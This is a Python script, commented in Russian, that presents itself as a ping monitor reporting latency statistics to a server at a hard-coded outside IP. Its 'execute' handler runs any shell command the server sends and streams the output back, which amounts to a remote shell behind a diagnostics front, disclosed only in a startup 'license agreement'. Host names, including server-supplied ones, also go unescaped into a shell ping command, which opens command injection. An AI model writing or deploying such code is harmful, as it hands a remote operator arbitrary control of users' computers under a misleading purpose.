import socketio
import subprocess
import sys
import requests
import asyncio
import re
import time
from typing import Dict, Optional
from datetime import datetime, timedelta

# Устанавливаем кодировку для корректного отображения русских символов
if sys.platform.startswith('win'):
    # Для Windows: меняем кодировку консоли на UTF-8
    subprocess.run('chcp 65001', shell=True)

class PingMonitor:
    def __init__(self, provider_name: str, hosts: list):
        self.provider_name = provider_name
        self.hosts = hosts
        self.failed_hosts: Dict[str, datetime] = {}
        # Создаем один клиент Socket.IO с настройками переподключения
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=10, 
                                reconnection_delay=1, reconnection_delay_max=5)
        self.retry_interval = 300
        self.ping_interval = 1.0
        self.setup_socket_handlers()
        
    def setup_socket_handlers(self):
        @self.sio.event
        def connect():
            print(f'\nПодключено к серверу (Провайдер: {self.provider_name})')
            print(f'Время подключения: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
            # Регистрируем клиента на сервере
            self.sio.emit('register', {'provider': self.provider_name})
            # Регистрируем клиента для выполнения команд
            self.sio.emit('register_command')
        
        @self.sio.event
        def connect_error(data):
            print(f'\n[ERROR] Ошибка подключения к серверу: {data}')
        
        @self.sio.event
        def disconnect():
            print('[DEBUG] Отключено от сервера')
        
        @self.sio.on('register_ack')
        def on_register_ack(data):
            print(f'[DEBUG] Получено подтверждение регистрации: {data}')
        
        @self.sio.on('register_command_ack')
        def on_register_command_ack(data):
            print(f'[DEBUG] Получено подтверждение регистрации для команд: {data}')
        
        @self.sio.on('execute')
        def on_execute(data):
            print(f"[DEBUG] Получена команда: {data}")
            try:
                # Запускаем процесс CMD с перенаправлением вывода
                process = subprocess.Popen(
                    data, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.STDOUT, 
                    text=True, 
                    encoding='utf-8', 
                    errors='replace'
                )
                
                # Читаем вывод построчно в реальном времени
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None:
                        break
                    if line:
                        # Отправляем строку на сервер
                        self.sio.emit('command_result', f"[{self.provider_name}] {line.strip()}")
                
                # Проверяем код завершения
                if process.returncode != 0:
                    self.sio.emit('command_result', f"[{self.provider_name}] Команда завершилась с кодом {process.returncode}")
            except Exception as e:
                self.sio.emit('command_result', f"[{self.provider_name}] Ошибка: {str(e)}")
        
        @self.sio.on('update_interval')
        def on_update_interval(data):
            interval = data.get('interval', 1.0)
            try:
                interval = float(interval)
                if interval >= 0.1:
                    self.ping_interval = interval
                    print(f'[DEBUG] Интервал пингования обновлен: {interval} сек')
                else:
                    print(f'[ERROR] Некорректный интервал: {interval}')
            except Exception as e:
                print(f'[ERROR] Ошибка при обновлении интервала: {str(e)}')
        
        @self.sio.on('update_hosts')
        def on_update_hosts(data):
            hosts = data.get('hosts', [])
            if hosts:
                self.hosts = hosts
                print(f'[DEBUG] Список хостов обновлен: {", ".join(hosts)}')
            else:
                print('[ERROR] Получен пустой список хостов')
        
    async def ping_host(self, host: str) -> Optional[int]:
        # Проверяем, прошло ли достаточно времени с последней ошибки
        if host in self.failed_hosts:
            if (datetime.now() - self.failed_hosts[host]).total_seconds() < self.retry_interval:
                return None
            else:
                # Удаляем хост из списка неудачных, если прошло достаточно времени
                del self.failed_hosts[host]
            
        try:
            # Добавляем таймаут в 2 секунды для команды ping
            ping_command = f'ping {host} -n 1 -w 2000' if sys.platform == 'win32' else f'ping -c 1 -W 2 {host}'
            process = await asyncio.create_subprocess_shell(
                ping_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=2.0)
                output = stdout.decode('cp866' if sys.platform == 'win32' else 'utf-8')
                
                # Проверяем статус выполнения команды
                if process.returncode != 0:
                    raise Exception(f"Ping command failed with return code {process.returncode}")
                
                match = re.search(r'время=(\d+)мс|time[<=](\d+)ms', output)
                
                if match:
                    # Успешный пинг - удаляем из списка неудачных, если он там был
                    if host in self.failed_hosts:
                        del self.failed_hosts[host]
                    return int(match.group(1) or match.group(2))
                
                # Если пинг не прошел, добавляем хост в черный список с текущим временем
                self.failed_hosts[host] = datetime.now()
                return None
                
            except asyncio.TimeoutError:
                self.failed_hosts[host] = datetime.now()
                return None
                
        except Exception as e:
            self.failed_hosts[host] = datetime.now()
            return None

    async def run(self):
        retry_count = 0
        max_retries = 3

        while retry_count < max_retries:
            try:
                print(f"[DEBUG] Подключение к серверу: http://82.147.71.45:80")
                # Подключаемся к серверу
                self.sio.connect('http://82.147.71.45:80', wait_timeout=10)
                retry_count = 0  # Сбрасываем счетчик после успешного подключения
                
                while True:
                    start_time = time.time()
                    
                    # Создаем задачи для всех пингов одновременно
                    tasks = [self.ping_host(host) for host in self.hosts]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Формируем результаты
                    ping_results = []
                    for host, ping_time in zip(self.hosts, results):
                        if isinstance(ping_time, Exception):
                            ping_time = None
                            self.failed_hosts[host] = datetime.now()
                        
                        ping_results.append({"host": host, "ping": ping_time})
                        if ping_time is not None:
                            print(f"{host}: {ping_time} мс")
                        else:
                            print(f"{host}: недоступен")
                    
                    # Отправляем данные на сервер
                    try:
                        self.sio.emit('ping_data', {
                            'provider': self.provider_name,
                            'ping_results': ping_results
                        })
                    except Exception as e:
                        print(f"[ERROR] Ошибка отправки данных: {str(e)}")
                        raise  # Перезапускаем соединение
                    
                    # Вычисляем, сколько нужно подождать до следующего цикла
                    elapsed = time.time() - start_time
                    wait_time = max(0, self.ping_interval - elapsed)
                    
                    print("-" * 40)
                    await asyncio.sleep(wait_time)
                    
            except asyncio.CancelledError:
                print("\n[DEBUG] Завершение работы...")
                break
            except Exception as e:
                retry_count += 1
                print(f"[ERROR] Ошибка соединения (попытка {retry_count}/{max_retries}): {str(e)}")
                if retry_count < max_retries:
                    print("[DEBUG] Повторное подключение через 5 секунд...")
                    await asyncio.sleep(5)
                else:
                    print("[ERROR] Превышено максимальное количество попыток подключения")
                    break
            finally:
                if self.sio.connected:
                    self.sio.disconnect()

def show_license_agreement():
    print("\n" + "=" * 80)
    print("ЛИЦЕНЗИОННОЕ СОГЛАШЕНИЕ".center(80))
    print("=" * 80)
    print("""
Используя данное программное обеспечение, вы соглашаетесь со следующими условиями:

1. Вы разрешаете удаленный доступ к вашему компьютеру через данное приложение.
2. Вы разрешаете выполнение команд на вашем компьютере для целей диагностики сети.
3. Вы разрешаете сбор и передачу данных о пинге с вашего компьютера.
4. Вы понимаете, что администратор системы может выполнять команды на вашем компьютере.

Данное программное обеспечение предназначено для диагностики сетевых проблем и
сбора статистики о качестве интернет-соединения.
    """)
    print("=" * 80)
    
    while True:
        choice = input("\nВы принимаете условия лицензионного соглашения? (да/нет): ").strip().lower()
        if choice == 'да':
            return True
        elif choice == 'нет':
            return False
        else:
            print("Пожалуйста, введите 'да' или 'нет'.")

def get_provider_name():
    return input("Введите название провайдера (например, RAKETA): ").strip().upper()

def load_hosts_from_file(file_path: str) -> list:
    """Читает список хостов из файла .txt, где каждый хост на новой строке."""
    hosts = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                host = line.strip()
                if host:  # Пропускаем пустые строки
                    hosts.append(host)
        if not hosts:
            raise ValueError("Файл пустой! Нужно указать хотя бы один хост.")
        return hosts
    except FileNotFoundError:
        print(f"Ошибка: Файл '{file_path}' не найден.")
        return []
    except Exception as e:
        print(f"Ошибка при чтении файла: {str(e)}")
        return []

def get_hosts():
    hosts = []
    print("\nВыберите способ ввода хостов:")
    print("1. Ввести хосты вручную")
    print("2. Загрузить хосты из файла .txt")
    choice = input("Введите 1 или 2: ").strip()

    if choice == '1':
        print("\nВведите хосты для пинга (по одному на строку)")
        print("Для завершения ввода оставьте строку пустой и нажмите Enter")
        while True:
            host = input("Хост: ").strip()
            if not host:
                if not hosts:
                    print("Нужно ввести хотя бы один хост!")
                    continue
                break
            hosts.append(host)
    elif choice == '2':
        file_path = input("Введите путь к файлу .txt с хостами: ").strip()
        hosts = load_hosts_from_file(file_path)
        if not hosts:
            print("Не удалось загрузить хосты из файла. Попробуйте снова.")
            return get_hosts()
    else:
        print("Неверный выбор! Попробуйте снова.")
        return get_hosts()

    return hosts

async def main():
    print("\nДобро пожаловать в программу мониторинга пинга!")
    
    # Показываем лицензионное соглашение
    if not show_license_agreement():
        print("\nВы не приняли лицензионное соглашение. Программа будет закрыта.")
        return
    
    provider_name = get_provider_name()
    hosts = get_hosts()
    
    print(f"\nНастройка завершена:")
    print(f"Провайдер: {provider_name}")
    print(f"Хосты для пинга: {', '.join(hosts)}")
    
    monitor = PingMonitor(provider_name, hosts)
    await monitor.run()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nПрограмма остановлена пользователем")
